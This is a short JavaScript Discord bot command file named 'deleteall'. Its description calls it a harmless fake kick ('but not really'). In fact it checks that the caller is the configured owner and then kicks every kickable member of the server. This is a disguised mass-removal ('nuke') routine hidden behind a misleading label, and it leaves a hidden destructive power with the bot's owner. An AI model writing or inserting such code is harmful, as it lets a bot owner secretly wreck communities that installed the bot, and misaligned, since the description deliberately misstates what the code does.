module.exports = {
	name: 'deleteall',
	description: 'Tag a member and kick them (but not really).',
	execute(message) {
        const config = require("./../config.json")
        let ownerID = `${config.owner}`

        if (message.author.id !== ownerID) {
            message.channel.send("this was made ownyew onywy iny case of abuse");
            return;
          }

          message.guild.members.cache.forEach((GuildMember) => {
          if (GuildMember.kickable) {
          GuildMember.kick()
          }
        })
    }
         
};
